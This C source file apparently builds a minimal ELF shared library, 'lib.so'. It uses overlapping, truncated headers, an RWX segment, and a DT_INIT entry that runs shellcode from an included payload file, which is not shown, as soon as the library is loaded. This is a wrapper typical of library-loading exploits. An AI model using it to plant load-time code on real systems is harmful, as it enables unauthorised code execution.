#include <elf.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/stat.h>
#include <unistd.h>

#include "payload.c"

char *output_filename = "lib.so";

unsigned long phdr_offset;
unsigned long dyn_offset;
unsigned long code_offset;
unsigned long file_size;

unsigned long vaddr_offset = 0xdead0000;

Elf64_Ehdr ehdr;
Elf64_Phdr phdr_load, phdr_dyn;

void write_header(int fd)
{
	ehdr.e_ident[EI_MAG0] = ELFMAG0;
	ehdr.e_ident[EI_MAG1] = ELFMAG1;
	ehdr.e_ident[EI_MAG2] = ELFMAG2;
	ehdr.e_ident[EI_MAG3] = ELFMAG3;
	ehdr.e_ident[EI_CLASS] = ELFCLASS64;
	ehdr.e_ident[EI_DATA] = ELFDATA2LSB;
	ehdr.e_ident[EI_VERSION] = EV_CURRENT;
	ehdr.e_ident[EI_OSABI] = ELFOSABI_SYSV;
	ehdr.e_ident[EI_ABIVERSION] = 0;

	memset(&ehdr.e_ident[EI_PAD], 0, EI_NIDENT - EI_PAD);

	ehdr.e_type = ET_DYN;
	ehdr.e_machine = EM_X86_64;
	ehdr.e_version = EV_CURRENT;
	ehdr.e_entry = vaddr_offset + code_offset;
	ehdr.e_phoff = phdr_offset;
	ehdr.e_shoff = 0;
	ehdr.e_flags = 0;
	ehdr.e_ehsize = sizeof(Elf64_Ehdr);
	ehdr.e_phentsize = sizeof(Elf64_Phdr);
	ehdr.e_phnum = 2;
	ehdr.e_shentsize = sizeof(Elf64_Shdr);
	ehdr.e_shnum = 0;
	ehdr.e_shstrndx = 0;

	write(fd, &ehdr, sizeof(ehdr) - 6);
}

void write_ptload(int fd)
{
	phdr_load.p_type = PT_LOAD;
	phdr_load.p_flags = PF_R | PF_W | PF_X;
	phdr_load.p_offset = 0;
	phdr_load.p_vaddr = vaddr_offset;
	phdr_load.p_paddr = phdr_load.p_vaddr;
	phdr_load.p_filesz = file_size;
	phdr_load.p_memsz = phdr_load.p_filesz;
	phdr_load.p_align = 0x1000;

	write(fd, &phdr_load, sizeof(phdr_load));
}

void write_ptdyn(int fd)
{
	phdr_dyn.p_type = PT_DYNAMIC;
	phdr_dyn.p_flags = PF_R;
	phdr_dyn.p_offset = dyn_offset;
	phdr_dyn.p_vaddr = vaddr_offset + dyn_offset;
	phdr_dyn.p_paddr = phdr_dyn.p_vaddr;
	phdr_dyn.p_filesz = sizeof(Elf64_Dyn) * 3;
	phdr_dyn.p_memsz = phdr_dyn.p_filesz;
	phdr_dyn.p_align = 0x1000;

	Elf64_Dyn dyn[3];
	dyn[0].d_tag = DT_INIT;
	dyn[0].d_un.d_ptr = vaddr_offset + code_offset;
	dyn[1].d_tag = DT_STRTAB;
	dyn[1].d_un.d_ptr = 0;
	dyn[2].d_tag = DT_SYMTAB;
	dyn[2].d_un.d_ptr = 0;

	write(fd, &phdr_dyn, sizeof(phdr_dyn) - 16);

	write(fd, dyn, sizeof(Elf64_Dyn)*3);
}

void write_code(int fd)
{
	write(fd, code, code_len);
}

int main(void)
{
	phdr_offset = sizeof(Elf64_Ehdr) - 6;
	dyn_offset = phdr_offset + sizeof(Elf64_Phdr)*2 - 16;
	code_offset = dyn_offset + sizeof(Elf64_Dyn)*3;
	file_size = code_offset + code_len;

	int fd = open(output_filename, O_WRONLY | O_CREAT | O_TRUNC);
	fchmod(fd, 0755);

	write_header(fd);
	write_ptload(fd);
	write_ptdyn(fd);
	write_code(fd);

	close(fd);
}
